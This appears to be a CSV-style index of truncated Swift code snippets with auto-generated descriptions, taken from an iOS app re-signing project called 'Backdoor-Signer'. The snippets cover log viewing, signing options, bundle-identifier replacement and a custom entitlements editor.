logTextView.isEditable = false
logTextView.translatesAutoresizingMaskIntoConstraints = false
logTextView.font = UIFont.monospacedSystemFont(ofSize: 10, weight: .regular)
logTextView.textContainerInset = UIEdgeInsets(top: 0, left: 16, bottom: 0, right: 16)
view.addSubview(logTextView)

tableView = UITableView(frame: .zero, style: .insetGrouped)"
2992,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift","Function loadInitialLogContents - implements loadinitiallogcontents functionality","private func loadInitialLogContents() {
let logFilePath = getDocumentsDirectory().appendingPathComponent(""logs.txt"")

guard let fileHandle = try? FileHandle(forReadingFrom: logFilePath) else {"
2993,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift","Function startObservingLogFile - implements startobservinglogfile functionality","private func startObservingLogFile() {
let logFilePath = getDocumentsDirectory().appendingPathComponent(""logs.txt"").path

let fileDescriptor = open(logFilePath, O_EVTONLY)
if fileDescriptor == -1 {"
2994,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift","Function loadNewLogContents - implements loadnewlogcontents functionality","private func loadNewLogContents() {
let logFilePath = getDocumentsDirectory().appendingPathComponent(""logs.txt"")

guard let fileHandle = try? FileHandle(forReadingFrom: logFilePath) else {"
2995,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift","Function scrollToBottom - implements scrolltobottom functionality","private func scrollToBottom() {
let bottomRange = NSMakeRange(logTextView.text.count - 1, 1)
logTextView.scrollRangeToVisible(bottomRange)
}

private func parseLogFile() {"
2996,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift","Function parseLogFile - implements parselogfile functionality","private func parseLogFile() {
let logFilePath = getDocumentsDirectory().appendingPathComponent(""logs.txt"")
do {"
2997,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift","extension LogsViewController - Controls user interface and application flow","extension LogsViewController: UITableViewDataSource, UITableViewDelegate {
func numberOfSections(in _: UITableView) -> Int { return 2 }"
2998,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift","Function numberOfSections - implements numberofsections functionality","func numberOfSections(in _: UITableView) -> Int { return 2 }
func tableView(_: UITableView, heightForFooterInSection _: Int) -> CGFloat { return 0 }"
2999,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, heightForFooterInSection _: Int) -> CGFloat { return 0 }

func tableView(_: UITableView, viewForFooterInSection _: Int) -> UIView? {"
3000,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, viewForFooterInSection _: Int) -> UIView? {
let headerView = InsetGroupedSectionHeader(title: """")
return headerView
}

func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {"
3001,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {
switch section {"
3002,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let reuseIdentifier = ""Cell""
let cell = UITableViewCell(style: .value1, reuseIdentifier: reuseIdentifier)
cell.accessoryType = .none
cell.selectionStyle = .none

switch (indexPath.section, indexPath.row) {"
3003,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
switch (indexPath.section, indexPath.row) {"
3004,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningData/SigningDataWrapper.swift","class SigningMainDataWrapper - implements functionality related to signing main data wrapper","class SigningMainDataWrapper: ObservableObject {
@Published var mainOptions: MainSigningOptions

init(mainOptions: MainSigningOptions) {"
3005,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningData/SigningDataWrapper.swift","class SigningDataWrapper - implements functionality related to signing data wrapper","class SigningDataWrapper: ObservableObject {
@Published var signingOptions: SigningOptions

init(signingOptions: SigningOptions) {"
3006,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningData/SigningOptions.swift","enum Orientation { .top .bottom .left .right }","struct MainSigningOptions {
var name: String?
var version: String?
var bundleId: String?
var iconURL: UIImage?

var uuid: String?
var removeInjectPaths: [String] = []

let forceMinimumVersionString = [""Automatic"", ""15.0"", ""14.0"", ""13.0""]"
3007,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningData/SigningOptions.swift","struct SigningOptions - implements functionality related to signing options","struct SigningOptions: Codable {
var ppqCheckProtection: Bool = false
var dynamicProtection: Bool = false
var installAfterSigned: Bool = false
var immediatelyInstallFromSource: Bool = false

var bundleIdConfig: [String: String] = [:]
var displayNameConfig: [String: String] = [:]
var toInject: [String] = []
"
3008,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningData/SigningOptions.swift","extension UserDefaults - implements functionality related to user defaults","extension UserDefaults {
static let signingDataKey = ""defaultSigningData""

static let defaultSigningData = SigningOptions()

var signingOptions: SigningOptions {"
3009,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningData/SigningOptions.swift","Function resetSigningOptions - implements resetsigningoptions functionality","func resetSigningOptions() {
signingOptions = UserDefaults.defaultSigningData
}
}
"
3010,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift","struct TogglesOption - implements functionality related to toggles option","struct TogglesOption {
let title: String
let footer: String?
var binding: Bool
}

func toggleOptions(signingDataWrapper: SigningDataWrapper) -> [TogglesOption] {"
3011,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift","Function toggleOptions - implements toggleoptions functionality","func toggleOptions(signingDataWrapper: SigningDataWrapper) -> [TogglesOption] {
return [
TogglesOption(
title: String.localized(""APP_SIGNING_INPUT_VIEW_CONTROLLER_REMOVE_PLUGINS""),
footer: String.localized(""APP_SIGNING_INPUT_VIEW_CONTROLLER_REMOVE_PLUGINS_DESCRIPTION""),
binding: signingDataWrapper.signingOptions.removePlugins
),
TogglesOption(
title: String.localized(""APP_SIGNING_INPUT_VIEW_CONTROLLER_REMOVE_ALLOW_BROWSING_DOCUMENTS""),
footer: String.localized(""APP_SIGNING_INPUT_VIEW_CONTROLLER_REMOVE_ALLOW_BROWSING_DOCUMENTS_DESCRIPTION""),"
3012,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift","class SigningsOptionViewController - Controls user interface and application flow","class SigningsOptionViewController: UITableViewController {
private var application: NSManagedObject?
private var appsViewController: LibraryViewController?
var signingDataWrapper: SigningDataWrapper

private var toggleOptions: [TogglesOption]

init(
signingDataWrapper: SigningDataWrapper,
application: NSManagedObject? = nil,"
3013,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift","Function save - implements save functionality","@objc func save() {
saveOptions()
}

func saveOptions() {"
3014,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift","Function saveOptions - implements saveoptions functionality","func saveOptions() {
UserDefaults.standard.signingOptions = signingDataWrapper.signingOptions
}

@available(*, unavailable)
required init?(coder _: NSCoder) {"
3015,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()
setupViews()
setupNavigation()
}

fileprivate func setupViews() {"
3016,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift","Function setupViews - sets upviews","fileprivate func setupViews() {
tableView.register(UITableViewCell.self, forCellReuseIdentifier: ""cell"")
}

fileprivate func setupNavigation() {"
3017,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift","Function setupNavigation - sets upnavigation","fileprivate func setupNavigation() {
navigationItem.largeTitleDisplayMode = .never
title = String.localized(""APP_SIGNING_VIEW_CONTROLLER_CELL_SIGNING_OPTIONS_TITLE"")
}

@objc func toggleOptionsSwitches(_ sender: UISwitch) {"
3018,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift","Function toggleOptionsSwitches - implements toggleoptionsswitches functionality","@objc func toggleOptionsSwitches(_ sender: UISwitch) {
Debug.shared.log(message: ""Toggle switch tag: \(sender.tag)"")

switch sender.tag {"
3019,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift","extension SigningsOptionViewController - Controls user interface and application flow","extension SigningsOptionViewController {
override func numberOfSections(in _: UITableView) -> Int {"
3020,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift","Function numberOfSections - implements numberofsections functionality","override func numberOfSections(in _: UITableView) -> Int {
return 2 + toggleOptions.count
}

override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {"
3021,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {
switch section {"
3022,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let cell = tableView
.dequeueReusableCell(withIdentifier: ""cell"") ?? UITableViewCell(style: .default, reuseIdentifier: ""cell"")
cell.textLabel?.textColor = .label
cell.accessoryView = nil

Debug.shared.log(message: ""Setting up cell at section: \(indexPath.section), row: \(indexPath.row)"")

switch [indexPath.section, indexPath.row] {"
3023,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
tableView.deselectRow(at: indexPath, animated: true)

switch [indexPath.section, indexPath.row] {"
3024,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {
if section == 1 {"
3025,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift","extension SigningsOptionViewController - Controls user interface and application flow","extension SigningsOptionViewController {
func showChangeIdentifierAlert() {"
3026,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/SigningsOptionViewController.swift","Function showChangeIdentifierAlert - implements showchangeidentifieralert functionality","func showChangeIdentifierAlert() {
let alert = UIAlertController(
title: String.localized(""SETTINGS_VIEW_CONTROLLER_CELL_CHANGE_IDENTIFIER""),
message: nil,
preferredStyle: .alert
)

alert.addTextField { textField in"
3027,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/AddIdentifierViewController.swift","class AddIdentifierViewController - Controls user interface and application flow","class AddIdentifierViewController: UITableViewController {
var onAdd: ((String, String) -> Void)?

private let identifierTextField: UITextField = {"
3028,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/AddIdentifierViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()
title = String.localized(""APP_SIGNING_VIEW_CONTROLLER_CELL_SIGNING_OPTIONS_IDENTIFIERS_NEW"")
view.backgroundColor = .systemBackground

identifierTextField.addTarget(self, action: #selector(textFieldsDidChange), for: .editingChanged)
replacementTextField.addTarget(self, action: #selector(textFieldsDidChange), for: .editingChanged)

navigationItem.rightBarButtonItem = UIBarButtonItem(
title: String.localized(""ADD""),"
3029,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/AddIdentifierViewController.swift","Function numberOfSections - implements numberofsections functionality","override func numberOfSections(in _: UITableView) -> Int {
return 1
}

override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {"
3030,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/AddIdentifierViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {
return 2
}

override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {"
3031,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/AddIdentifierViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let cell = UITableViewCell(style: .default, reuseIdentifier: nil)
cell.selectionStyle = .none

switch indexPath.row {"
3032,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/AddIdentifierViewController.swift","Function textFieldsDidChange - implements textfieldsdidchange functionality","@objc private func textFieldsDidChange() {
let identifierText = identifierTextField.text ?? """"
let replacementText = replacementTextField.text ?? """"
navigationItem.rightBarButtonItem?.isEnabled = !identifierText.isEmpty && !replacementText.isEmpty
}

@objc private func addButtonTapped() {"
3033,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/AddIdentifierViewController.swift","Function addButtonTapped - implements addbuttontapped functionality","@objc private func addButtonTapped() {
if let identifier = identifierTextField.text,
let replacement = replacementTextField.text,
!identifier.isEmpty, !replacement.isEmpty
{"
3034,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift","enum IdentifierMode - implements functionality related to identifier mode","enum IdentifierMode {
case bundleId
case displayName
}

class IdentifiersViewController: UITableViewController {"
3035,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift","class IdentifiersViewController - Controls user interface and application flow","class IdentifiersViewController: UITableViewController {
var signingDataWrapper: SigningDataWrapper
private var mode: IdentifierMode

init(signingDataWrapper: SigningDataWrapper, mode: IdentifierMode) {"
3036,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()

navigationItem.rightBarButtonItem = UIBarButtonItem(
barButtonSystemItem: .add,
target: self,
action: #selector(addIdentifierTapped)
)

tableView.register(UITableViewCell.self, forCellReuseIdentifier: ""IdentifierCell"")"
3037,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift","Function numberOfSections - implements numberofsections functionality","override func numberOfSections(in _: UITableView) -> Int {
switch mode {"
3038,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {
return 1
}

override func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {"
3039,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {
switch mode {"
3040,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let cell = tableView.dequeueReusableCell(withIdentifier: ""IdentifierCell"", for: indexPath)

switch mode {"
3041,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView,
trailingSwipeActionsConfigurationForRowAt indexPath: IndexPath)
-> UISwipeActionsConfiguration?
{"
3042,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift","Function deleteIdentifier - deletes identifier","private func deleteIdentifier(at index: Int) {
switch mode {"
3043,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningOptionsViewController/Identifier/IdentifiersViewController.swift","Function addIdentifierTapped - implements addidentifiertapped functionality","@objc private func addIdentifierTapped() {
let addVC = AddIdentifierViewController(mode: mode)
addVC.onAdd = { [weak self] identifier, replacement in"
3044,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","/ View controller for editing custom entitlements during app signing","class EntitlementsEditorViewController: FRSITableViewController {
// MARK: - Properties

/// User's custom entitlements
private var entitlements: [Entitlement] = [] {"
3045,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()

// Load entitlements from signing options
loadEntitlementsFromSigningOptions()

// Configure UI
configureNavigationBar()
configureTableView()
"
3046,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)

// Ensure navigation bar is visible and properly styled
navigationController?.setNavigationBarHidden(false, animated: animated)
navigationController?.navigationBar.prefersLargeTitles = false

// Apply LED effects
applyLEDEffectsToTableView()
}"
3047,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","MARK: - UI Configuration","private func configureNavigationBar() {
title = ""Custom Entitlements""

// Add buttons
addButton = UIBarButtonItem(
image: UIImage(systemName: ""plus.circle.fill""),
style: .plain,
target: self,
action: #selector(addEntitlementTapped)
)"
3048,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","Function configureTableView - implements configuretableview functionality","private func configureTableView() {
tableView.register(UITableViewCell.self, forCellReuseIdentifier: ""EntitlementCell"")
tableView.separatorStyle = .singleLine
tableView.backgroundColor = .systemBackground
tableView.rowHeight = UITableView.automaticDimension
tableView.estimatedRowHeight = 70

// Empty state message
updateEmptyStateIfNeeded()
}"
3049,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","Function applyLEDEffectsToTableView - implements applyledeffectstotableview functionality","private func applyLEDEffectsToTableView() {
// Add subtle LED glow to section headers
for section in 0 ..< tableView.numberOfSections {"
3050,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","Function applyLEDEffectsToSearchBar - implements applyledeffectstosearchbar functionality","private func applyLEDEffectsToSearchBar() {
// Find the search bar's text field
if let textField = searchController.searchBar.value(forKey: ""searchField"") as? UITextField {"
3051,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","Function applyCellLEDEffect - implements applycellledeffect functionality","private func applyCellLEDEffect(_ cell: UITableViewCell, animated: Bool) {
// Add a subtle LED effect to the cell
cell.contentView.addLEDEffect(
color: UIColor.systemBlue,
intensity: 0.2,
spread: 8,
animated: animated,
animationDuration: 3.0
)
}"
3052,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","Function updateEmptyStateIfNeeded - updates emptystateifneeded","private func updateEmptyStateIfNeeded() {
let displayedEntitlements = isSearching ? filteredEntitlements : entitlements

// Get or create empty state label
let emptyStateTag = 1001
let emptyLabel: UILabel

if let existing = tableView.viewWithTag(emptyStateTag) as? UILabel {"
3053,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","MARK: - Actions","@objc private func addEntitlementTapped() {
showEntitlementEditor()
}

@objc private func quickAddTapped() {"
3054,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","Function quickAddTapped - implements quickaddtapped functionality","@objc private func quickAddTapped() {
// Create action sheet with common entitlements
let alertController = UIAlertController(
title: ""Add Common Entitlement"",
message: ""Select an entitlement to add"",
preferredStyle: .actionSheet
)

// Add actions for common entitlements
for entitlement in CommonEntitlements.all {"
3055,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","Function showEntitlementEditor - implements showentitlementeditor functionality","private func showEntitlementEditor(preset: Entitlement? = nil, editingIndex: Int? = nil) {
let alertController = UIAlertController(
title: editingIndex != nil ? ""Edit Entitlement"" : ""Add Entitlement"",
message: nil,
preferredStyle: .alert
)

// Add text fields
alertController.addTextField { textField in"
3056,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","MARK: - Data Methods","private func loadEntitlementsFromSigningOptions() {
// Get entitlements dictionary from signing options
if let entitlementsDict = signingDataWrapper.signingOptions.customEntitlements {"
3057,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","Function saveEntitlementsToSigningOptions - implements saveentitlementstosigningoptions functionality","private func saveEntitlementsToSigningOptions() {
// Convert array of Entitlement objects to dictionary
var entitlementsDict: [String: Any] = [:]
for entitlement in entitlements {"
3058,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","MARK: - UITableViewDataSource","override func numberOfSections(in _: UITableView) -> Int {
return 1
}

override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {"
3059,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {
let count = isSearching ? filteredEntitlements.count : entitlements.count
updateEmptyStateIfNeeded()
return count
}

override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {"
3060,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let cell = tableView.dequeueReusableCell(withIdentifier: ""EntitlementCell"", for: indexPath)
let displayedEntitlements = isSearching ? filteredEntitlements : entitlements

if let entitlement = displayedEntitlements[safe: indexPath.row] {"
3061,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","MARK: - UITableViewDelegate","override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
tableView.deselectRow(at: indexPath, animated: true)
showEntitlementEditor(editingIndex: indexPath.row)
}

override func tableView(_ tableView: UITableView,
trailingSwipeActionsConfigurationForRowAt indexPath: IndexPath)
-> UISwipeActionsConfiguration?
{"
3062,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView,
trailingSwipeActionsConfigurationForRowAt indexPath: IndexPath)
-> UISwipeActionsConfiguration?
{"
3063,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, viewForHeaderInSection _: Int) -> UIView? {
let headerView = UIView()
headerView.backgroundColor = .clear

let label = UILabel()
label.text = ""Custom Entitlements""
label.font = .systemFont(ofSize: 18, weight: .medium)
label.textColor = .label
label.translatesAutoresizingMaskIntoConstraints = false
"
3064,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, heightForHeaderInSection _: Int) -> CGFloat {
return 44
}
}

// MARK: - UISearchResultsUpdating

extension EntitlementsEditorViewController: UISearchResultsUpdating {"
3065,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","MARK: - UISearchResultsUpdating","extension EntitlementsEditorViewController: UISearchResultsUpdating {
func updateSearchResults(for searchController: UISearchController) {"
3066,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","Function updateSearchResults - updates searchresults","func updateSearchResults(for searchController: UISearchController) {
filterEntitlements(with: searchController.searchBar.text ?? """")
}

private func filterEntitlements(with searchText: String) {"
3067,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","Function filterEntitlements - implements filterentitlements functionality","private func filterEntitlements(with searchText: String) {
if searchText.isEmpty {"
3068,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","MARK: - Safe Array Access Extension","extension Array {
subscript(safe index: Index) -> Element? {"
3069,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","MARK: - SigningDataWrapper Extension Extension to provide customEntitlements access","extension SigningDataWrapper {
// Add an accessor to get to the SigningOptions
var signingOptionsWithEntitlements: SigningOptions {"
3070,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","Helper extension to store entitlements","extension SigningOptions {
/// Helper to access entitlements through additionalData
func getEntitlementsFromAdditionalData() -> [String: Any]? {"
3071,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","/ Helper to access entitlements through additionalData","func getEntitlementsFromAdditionalData() -> [String: Any]? {
guard let entitlementsJson = additionalData?[""customEntitlements""] else {"
3072,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift","/ Helper to store entitlements in additionalData","mutating func setEntitlementsToAdditionalData(_ entitlements: [String: Any]?) {
if additionalData == nil {"
3073,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SettingsAltIconView.swift","struct SettingsAltIconView - UI component for display and interaction","struct SettingsAltIconView: View {
@Environment(\.dismiss) var dismiss

private let mainOptions: SigningMainDataWrapper
private let applicationPath: URL

init(mainOptions: SigningMainDataWrapper, app: URL) {"
3074,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SettingsAltIconView.swift","extension SettingsAltIconView - UI component for display and interaction","extension SettingsAltIconView {
// im not making this better, I may be reusing code but I dont carfe
private func loadDefaultIcon() -> String? {"
3075,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SettingsAltIconView.swift","im not making this better, I may be reusing code but I dont carfe","private func loadDefaultIcon() -> String? {
let infoPlistPath = applicationPath.appendingPathComponent(""Info.plist"")
guard let infoPlist = NSDictionary(contentsOf: infoPlistPath),
let iconDict = infoPlist[""CFBundleIcons""] as? [String: Any],
let primaryIcon = iconDict[""CFBundlePrimaryIcon""] as? [String: Any],
let files = primaryIcon[""CFBundleIconFiles""] as? [String],
let iconPath = files.first
else {"
